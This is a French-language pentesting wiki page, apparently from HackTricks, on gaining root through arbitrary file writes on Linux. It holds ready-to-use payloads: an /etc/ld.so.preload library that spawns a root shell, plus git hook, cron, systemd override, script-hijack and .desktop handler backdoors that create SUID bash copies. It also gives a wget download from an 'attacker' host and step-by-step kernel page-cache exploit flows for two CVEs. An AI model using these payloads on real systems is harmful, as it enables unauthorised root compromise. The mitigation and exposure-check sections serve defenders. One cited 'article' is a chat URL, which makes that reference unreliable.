# Écriture de fichier arbitraire vers root

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

Ce fichier se comporte comme la variable d'environnement **`LD_PRELOAD`**, mais il fonctionne également avec les **binaires SUID**.\
Si vous pouvez le créer ou le modifier, vous pouvez simplement y ajouter un **chemin vers une bibliothèque qui sera chargée** avec chaque binaire exécuté.

Par exemple : `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

[**Git hooks**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) sont des **scripts** qui sont **exécutés** lors de différents **événements** dans un dépôt Git, par exemple lorsqu’un commit est créé, lors d’un merge... Ainsi, si un **script ou utilisateur privilégié** effectue fréquemment ces actions et qu’il est possible **d’écrire dans le dossier `.git`**, cela peut être utilisé pour faire une **privesc**.

Par exemple, il est possible de **générer un script** dans un dépôt Git, dans **`.git/hooks`**, afin qu’il soit toujours exécuté lorsqu’un nouveau commit est créé :
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/b' > pre-commit
chmod +x pre-commit
```
### Fichiers Cron et fichiers liés au temps

Si vous pouvez **écrire dans des fichiers liés à Cron que root exécute**, vous pouvez généralement obtenir une **code execution** lors de la prochaine exécution de la tâche. Les cibles intéressantes incluent :

- `/etc/crontab`
- `/etc/cron.d/*`
- `/etc/cron.hourly/*`, `/etc/cron.daily/*`, `/etc/cron.weekly/*`, `/etc/cron.monthly/*`
- La crontab de root dans `/var/spool/cron/` ou `/var/spool/cron/crontabs/`
- Les timers `systemd` et les services qu’ils déclenchent

Vérifications rapides :
```bash
ls -la /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
find /var/spool/cron* -maxdepth 2 -type f -ls 2>/dev/null
systemctl list-timers --all 2>/dev/null
grep -R "run-parts\\|cron" /etc/crontab /etc/cron.* /etc/cron.d 2>/dev/null
```
Voies d’abus typiques :

- **Ajouter une nouvelle tâche cron root** à `/etc/crontab` ou dans un fichier de `/etc/cron.d/`
- **Remplacer un script** déjà exécuté par `run-parts`
- **Créer une backdoor dans une cible de timer existante** en modifiant le script ou le binaire qu’elle lance

Exemple minimal de payload cron :
```bash
echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' >> /etc/crontab
```
Si vous pouvez uniquement écrire dans un répertoire cron utilisé par `run-parts`, déposez-y plutôt un fichier exécutable :
```bash
cat > /etc/cron.daily/backup <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4777 /tmp/rootbash
EOF
chmod +x /etc/cron.daily/backup
```
Notes :

- `run-parts` ignore généralement les noms de fichiers contenant des points ; préférez donc des noms comme `backup` plutôt que `backup.sh`.
- Certaines distros utilisent `anacron` ou des timers `systemd` au lieu du cron classique, mais l'idée d'abus reste la même : **modifier ce que root exécutera ultérieurement**.

### Fichiers de Service et de Socket

Si vous pouvez écrire des fichiers d'unités **`systemd`** ou des fichiers référencés par ceux-ci, vous pourrez peut-être obtenir une exécution de code en tant que root en rechargeant et en redémarrant l'unité, ou en attendant que le chemin d'activation du service/socket se déclenche.

Les cibles intéressantes comprennent :

- `/etc/systemd/system/*.service`
- `/etc/systemd/system/*.socket`
- Overrides drop-in dans `/etc/systemd/system/<unit>.d/*.conf`
- Scripts/binaires de service référencés par `ExecStart=`, `ExecStartPre=`, `ExecStartPost=`
- Chemins `EnvironmentFile=` inscriptibles chargés par un service root

Vérifications rapides :
```bash
ls -la /etc/systemd/system /lib/systemd/system 2>/dev/null
systemctl list-units --type=service --all 2>/dev/null
systemctl list-units --type=socket --all 2>/dev/null
grep -R "^ExecStart=\\|^EnvironmentFile=\\|^ListenStream=" /etc/systemd/system /lib/systemd/system 2>/dev/null
```
Méthodes d’abus courantes :

- **Overwrite `ExecStart=`** dans une unité de service appartenant à root que vous pouvez modifier
- **Add a drop-in override** avec un `ExecStart=` malveillant et effacer l’ancien au préalable
- **Backdoor** le script/binaire déjà référencé par l’unité
- **Hijack** un service activé par socket en modifiant le fichier `.service` correspondant, qui démarre lorsque le socket reçoit une connexion

Exemple de override malveillant :
```ini
[Service]
ExecStart=
ExecStart=/bin/sh -c 'cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash'
```
Flux d’activation typique :
```bash
systemctl daemon-reload
systemctl restart vulnerable.service
# or trigger the socket-backed service by connecting to it
```
Si vous ne pouvez pas redémarrer vous-même les services, mais que vous pouvez modifier une unité activée par socket, vous devrez peut-être simplement **attendre une connexion client** pour déclencher l’exécution du service backdooré en tant que root.

### Écraser un `php.ini` restrictif utilisé par un sandbox PHP privilégié

Certains daemons personnalisés valident le PHP fourni par l’utilisateur en exécutant `php` avec un **`php.ini` restrictif** (par exemple, `disable_functions=exec,system,...`). Si le code exécuté dans le sandbox dispose toujours d’une **primitive d’écriture** (comme `file_put_contents`) et que vous pouvez atteindre le **chemin exact du `php.ini`** utilisé par le daemon, vous pouvez **écraser cette configuration** pour lever les restrictions, puis soumettre un second payload qui s’exécute avec des privilèges élevés.

Flux typique :

1. Le premier payload écrase la configuration du sandbox.
2. Le second payload exécute du code maintenant que les fonctions dangereuses sont réactivées.

Exemple minimal (remplacez le chemin utilisé par le daemon) :
```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```
Si le daemon s'exécute en tant que root (ou effectue des validations avec des chemins appartenant à root), la seconde exécution se fait dans un contexte root. Il s'agit essentiellement d'une **élévation de privilèges via la réécriture de la configuration** lorsque le runtime sandboxé peut toujours écrire des fichiers.

### binfmt_misc

Le fichier situé dans `/proc/sys/fs/binfmt_misc` indique quel binaire doit exécuter quel type de fichiers. TODO : vérifier les conditions requises pour exploiter cela afin d'exécuter un rev shell lorsqu'un type de fichier courant est ouvert.

### Remplacer les handlers de schéma (comme http: ou https:)

Un attaquant disposant des permissions d'écriture sur les répertoires de configuration d'une victime peut facilement remplacer ou créer des fichiers qui modifient le comportement du système, ce qui entraîne une exécution de code involontaire. En modifiant le fichier `$HOME/.config/mimeapps.list` pour rediriger les handlers d'URL HTTP et HTTPS vers un fichier malveillant (par exemple, en définissant `x-scheme-handler/http=evil.desktop`), l'attaquant s'assure que **cliquer sur n'importe quel lien http ou https déclenche le code spécifié dans ce fichier `evil.desktop`**. Par exemple, après avoir placé le code malveillant suivant dans `evil.desktop`, dans `$HOME/.local/share/applications`, tout clic sur une URL externe exécute la commande intégrée :
```bash
[Desktop Entry]
Exec=sh -c 'zenity --info --title="$(uname -n)" --text="$(id)"'
Type=Application
Name=Evil Desktop Entry
```
Pour plus d’informations, consultez [**cet article**](https://chatgpt.com/c/67fac01f-0214-8006-9db3-19c40e45ee49), dans lequel cette technique a été utilisée pour exploiter une vulnérabilité réelle.

### Root exécutant des scripts/binaires accessibles en écriture par un utilisateur

Si un workflow privilégié exécute quelque chose comme `/bin/sh /home/username/.../script` (ou n’importe quel binaire situé dans un répertoire appartenant à un utilisateur non privilégié), vous pouvez le détourner :

- **Détecter l’exécution :** surveillez les processus avec [pspy](https://github.com/DominicBreuker/pspy) afin de repérer root invoquant des chemins contrôlés par l’utilisateur :
```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```
- **Confirmer la possibilité d’écriture :** assurez-vous que le fichier cible et son répertoire appartiennent à votre utilisateur et que celui-ci peut y écrire.
- **Détourner la cible :** sauvegardez le binaire/script d’origine et déposez un payload qui crée un SUID shell (ou toute autre action root), puis restaurez les permissions :
```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```
- **Déclencher l'action privilégiée** (par exemple, appuyer sur un bouton d'interface qui lance le helper). Lorsque root réexécute le chemin détourné, récupérez le shell avec privilèges élevés avec `./rootshell -p`.

### Modification de fichiers limitée au page cache de binaires privilégiés

Certains bugs du kernel ne modifient pas le fichier **sur le disque**. Ils permettent plutôt de modifier uniquement la **copie du page cache** d'un fichier lisible. Si vous pouvez cibler un binaire **setuid** ou exécuté d'une autre manière par **root**, l'exécution suivante peut lancer des octets contrôlés par l'attaquant depuis la mémoire et permettre une escalation de privilèges, même si le hash du fichier sur le disque reste inchangé.

Il est utile de considérer cela comme une **primitive d'écriture de fichier limitée au runtime** :

- **Le disque reste propre** : l'inode et les octets sur le disque ne changent pas
- **La mémoire est modifiée** : les processus qui lisent ou exécutent la page en cache obtiennent le contenu modifié par l'attaquant
- **L'effet est temporaire** : la modification disparaît après un reboot ou une éviction du cache

Cette primitive se situe entre l'**arbitrary file write** classique et les anciens bugs d'abus du **page cache** tels que Dirty COW / Dirty Pipe :

- Dirty COW reposait sur une race
- Dirty Pipe avait des contraintes sur la position d'écriture
- Une primitive limitée au page cache peut être plus fiable si le chemin vulnérable permet des écritures directes dans des pages de fichiers mises en cache

#### Generic privesc flow

1. Obtenir une primitive kernel capable d'écrire dans des **pages du page cache associées à des fichiers**
2. L'utiliser contre un **binaire privilégié lisible** ou un autre fichier exécuté par root
3. Déclencher l'exécution **avant** que la page ne soit évincée du cache
4. Obtenir une exécution de code en tant que root tandis que le fichier sur le disque semble toujours inchangé

Cibles à forte valeur typiques :

- Binaires **setuid-root**
- Helpers lancés par des **services root**
- Binaires fréquemment exécutés depuis des **containers partageant le kernel/page cache de l'hôte**

#### AF_ALG + `splice()` example path

Copy Fail (CVE-2026-31431) est un bon exemple de cette classe. Le chemin vulnérable se trouvait dans l'API userspace de cryptographie Linux (`AF_ALG` / `algif_aead`) :

- `splice()` peut déplacer des références vers des pages du page cache depuis un fichier lisible vers la scatterlist TX de cryptographie
- le chemin de déchiffrement in-place de `algif_aead` réutilisait les buffers source et destination
- `authencesn` écrivait ensuite dans la région de tag de destination
- lorsque cette région référençait encore des pages associées au fichier dans le page cache, l'écriture se retrouvait dans le **page cache du fichier cible**

La technique intéressante n'est donc pas le CVE lui-même, mais le pattern :

- **injecter des pages de cache associées à un fichier dans un subsystem du kernel**
- faire en sorte que le subsystem les **traite comme une sortie inscriptible**
- déclencher une petite surcharge contrôlée en mémoire

Le PoC public utilisait des **écritures répétées de 4 octets** pour patcher `/usr/bin/su` en mémoire, puis l'exécutait.

#### ESP / XFRM + netfilter TEE clone example path

DirtyClone (CVE-2026-43503) montre une autre variante du même pattern de **page-cache-only write-to-root**, mais cette fois le sink est le **déchiffrement IPsec ESP** au lieu de `AF_ALG`.

La technique importante est l'étape de **metadata-laundering** :

- `splice()` place une **page du page cache en lecture seule associée à un fichier** dans un paquet ESP-in-UDP
- la mitigation DirtyFrag d'origine marquait ce skb avec `SKBFL_SHARED_FRAG` afin que `esp_input()` effectue une **copie avant le déchiffrement**
- netfilter `TEE` duplique le paquet via `nf_dup_ipv4()` -> `__pskb_copy_fclone()`
- le clone conserve la **même référence physique vers la page du page cache**, mais perd `SKBFL_SHARED_FRAG`
- `esp_input()` considère alors le clone comme sûr et exécute le déchiffrement **in-place `cbc(aes)`** sur la page associée au fichier

La leçon pour les reviewers dépasse le CVE : si une mitigation dépend des **métadonnées du skb/de la page** pour décider si une opération doit d'abord effectuer une copie, tout **chemin de clonage/copie qui conserve la page sous-jacente mais supprime les métadonnées** peut rouvrir silencieusement la primitive d'écriture.

Flux d'exploitation typique :

1. `unshare(CLONE_NEWUSER | CLONE_NEWNET)` pour obtenir **`CAP_NET_ADMIN` dans un network namespace privé**
2. activer la loopback et installer une règle **netfilter `TEE`** dans `mangle/OUTPUT`
3. installer des SA de transport XFRM ESP via `NETLINK_XFRM`
4. encoder chaque mot cible de 4 octets dans le champ `seq_hi` de la SA (technique de sélection de mots de DirtyFrag)
5. envoyer le paquet ESP-in-UDP splicé afin que le **clone TEE** atteigne `esp_input()` et effectue le déchiffrement **in-place**
6. répéter jusqu'à ce que la copie dans le page cache de `/usr/bin/su` ou d'un autre exécutable privilégié contienne du code contrôlé par l'attaquant

Sur le plan opérationnel, l'impact est le même que dans l'exemple `AF_ALG` : le fichier sur le disque reste propre, mais `execve()` utilise les **octets modifiés du page cache** et fournit un accès root.

Vérifications d'exposition utiles pour cette variante :
```bash
unshare -Urn true 2>/dev/null && echo "user+net namespaces available"
sysctl kernel.apparmor_restrict_unprivileged_userns 2>/dev/null
modprobe -n -v xt_TEE 2>/dev/null
modprobe -n -v esp4 2>/dev/null
modprobe -n -v esp6 2>/dev/null
lsmod | egrep 'xt_TEE|nf_dup_ipv4|esp4|esp6|x_tables'
```
La réduction à court terme de la surface d'attaque est également spécifique au chemin ici : la mise à niveau vers un kernel contenant `48f6a5356a33` corrige le chemin `clone`, tandis que le blocage de l'autoload de `xt_TEE` supprime l'étape de **flag-laundering** et que le blocage de `esp4` / `esp6` supprime le **decrypt sink**.

#### Exposition et hunting

Si vous suspectez cette classe de bug, ne vous fiez pas uniquement aux contrôles d'intégrité du disque. Vérifiez également :
```bash
uname -r
grep CONFIG_CRYPTO_USER_API_AEAD= /boot/config-$(uname -r) 2>/dev/null
lsmod | grep algif_aead
find / -perm -4000 -type f 2>/dev/null
```
- `CONFIG_CRYPTO_USER_API_AEAD=m` : `algif_aead` peut être chargé ou déchargé comme module
- `CONFIG_CRYPTO_USER_API_AEAD=y` : l'interface est intégrée au kernel
- les binaires setuid sont de bonnes cibles, car un patch limité au page cache peut suffire à transformer un point d'appui local en root

#### Réduction de la surface d'attaque pour le chemin `algif_aead`

Si l'interface vulnérable est fournie par un module chargeable :
```bash
echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif.conf
rmmod algif_aead 2>/dev/null || true
```
Si elle est compilée dans le kernel, certains leaks ont signalé le blocage du chemin init avec :
```bash
initcall_blacklist=algif_aead_init
```
Ce type de mitigation mérite également d’être retenu pour d’autres LPE du kernel : si l’exploitation dépend d’une interface optionnelle spécifique, désactiver ou blacklister cette interface peut interrompre le chemin d’exploitation avant même qu’une mise à niveau complète du kernel soit disponible.

## Références

- [HTB Bamboo – détournement d’un script exécuté avec les privilèges root dans un répertoire PaperCut accessible en écriture par l’utilisateur](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [HTB : Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)
- [Tenable : Copy Fail (CVE-2026-31431) FAQ](https://www.tenable.com/blog/copy-fail-cve-2026-31431-frequently-asked-questions-about-linux-kernel-privilege-escalation)
- [Divulgation Openwall oss-security concernant CVE-2026-31431](https://www.openwall.com/lists/oss-security/2026/04/29/23)
- [Correctif Linux stable : crypto: algif_aead - Revert to operating out-of-place](https://git.kernel.org/stable/c/a664bf3d603dc3bdcf9ae47cc21e0daec706d7a5)
- [Avis Copy Fail](https://copy.fail/)
- [Theori / analyse technique de Xint](https://xint.io/blog/copy-fail-linux-distributions)
- [Dépôt / README de DirtyClone](https://github.com/rafaeldtinoco/security/tree/main/exploits/dirtyclone)
- [JFrog : analyse et exploitation de la variante LPE Linux DirtyClone (CVE-2026-43503)](https://research.jfrog.com/post/dissecting-and-exploiting-linux-lpe-variant-dirtyclone-cve-2026-43503/)
- [Correctif Linux : net: skb: préserver `SKBFL_SHARED_FRAG` dans `__pskb_copy_fclone()` (`48f6a5356a33`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=48f6a5356a33)
- [Mitigation Linux antérieure : définir `SKBFL_SHARED_FRAG` pour les paquets UDP spliceés (`f4c50a4034e6`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f4c50a4034e6)

{{#include ../../banners/hacktricks-training.md}}
